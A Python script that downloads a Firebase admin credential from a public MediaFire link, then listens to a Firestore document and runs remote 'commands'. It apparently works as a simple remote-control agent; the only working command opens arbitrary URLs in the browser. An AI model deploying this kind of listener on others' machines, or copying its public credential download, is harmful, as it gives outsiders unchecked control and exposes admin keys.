import os
import firebase_admin
from firebase_admin import credentials, firestore
import webbrowser
import requests
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
from comtypes import CLSCTX_ALL

# Configura Firebase
base_dir = os.path.dirname(os.path.abspath(__file__))

def download_file(url, destination):
    """Descarga un archivo desde una URL y lo guarda en el destino especificado."""
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(destination, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            print(f'File downloaded and saved to: {destination}')
        else:
            print(f'Failed to download file. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error downloading file: {e}')

def setup_firebase():
    cred_path = os.path.join(base_dir, 'hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json')
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred)
    return firestore.client()

def start(url):
    webbrowser.open(url)

def read_count_id_from_file(filename):
    """Lee el ID de cliente desde el archivo count_id.txt."""
    try:
        with open(filename, 'r') as file:
            count_id = file.read().strip()
            return count_id
    except Exception as e:
        print(f'Error reading count_id from file: {e}')
        return None

def execute_command(command):
    """Ejecuta el comando recibido."""
    try:
        # Usa un diccionario para mapear comandos a funciones
        command_dict = {
            'start': start,
        }
        
        # Divide el comando en función y parámetros
        if '(' in command and ')' in command:
            func_name = command.split('(')[0].strip()
            args = command.split('(')[1].split(')')[0].strip()
            
            if func_name in command_dict:
                func = command_dict[func_name]
                
                # Procesa los argumentos
                if args:
                    # Asume que los argumentos están separados por comas
                    args_list = args.split(',')
                    # Limpia los argumentos para eliminar comillas innecesarias y espacios
                    args_list = [arg.strip().strip('"').strip("'") for arg in args_list]
                    
                    print(f'Parsed arguments: {args_list}')  # Depuración

                    # Verifica el tipo de cada argumento y conviértelo al tipo adecuado
                    if func_name == 'start' and len(args_list) == 1:
                        func(args_list[0])
                    elif func_name == 'set_volume' and len(args_list) == 1:
                        try:
                            volume_level = float(args_list[0])
                            func(volume_level)
                        except ValueError:
                            print(f'Invalid volume level: {args_list[0]}')
                    else:
                        print(f'Invalid arguments for function: {func_name}')
                else:
                    func()  # Llama a la función sin argumentos
            else:
                print(f'Unknown function: {func_name}')
        else:
            print(f'Invalid command format: {command}')
    except Exception as e:
        print(f'Error executing command: {e}')

def listen_for_command(count_id):
    user_ref = db.collection('users').document(count_id)
    
    def handle_change(doc_snapshot, changes, read_time):
        for doc in doc_snapshot:
            command_data = doc.to_dict()
            command = command_data.get('command')
            if command:
                execute_command(command)
    
    # Crear un listener para cambios en el documento de `count_id` dentro de `users`
    user_ref.on_snapshot(handle_change)
    print(f'Listening for changes in commands for user with ID {count_id}')

def main():
    # URL del archivo JSON
    json_url = 'https://download1336.mediafire.com/jff9kow712igVXIz48XowyuWa4UsoOoNhlqqlgqW0VptMZMHsfLphJpflhnsKUQGd0snS_GB1OlMwrniP6LciMXTBu9nhszvQ5Hs1mb51RgVbgLLFBDplIsY8Eqd0kXoHj-sAVB2R0DE6GgC6Co-05bByU7JjHIA-7eEXifM5B9v/lx0ugbsbi3obotl/hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json'
    json_file_path = os.path.join(base_dir, 'hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json')
    
    # Descargar el archivo JSON si no existe
    if not os.path.isfile(json_file_path):
        download_file(json_url, json_file_path)
    
    # Configurar Firebase
    global db
    db = setup_firebase()
    
    count_id = read_count_id_from_file(os.path.join(base_dir, 'count_id.txt'))
    if count_id:
        listen_for_command(count_id)
        # Mantener el script en ejecución
        try:
            while True:
                pass  # Bucle infinito para mantener el script en ejecución
        except KeyboardInterrupt:
            print('Shutting down...')
    else:
        print('Failed to read count_id from file.')

if __name__ == '__main__':
    main()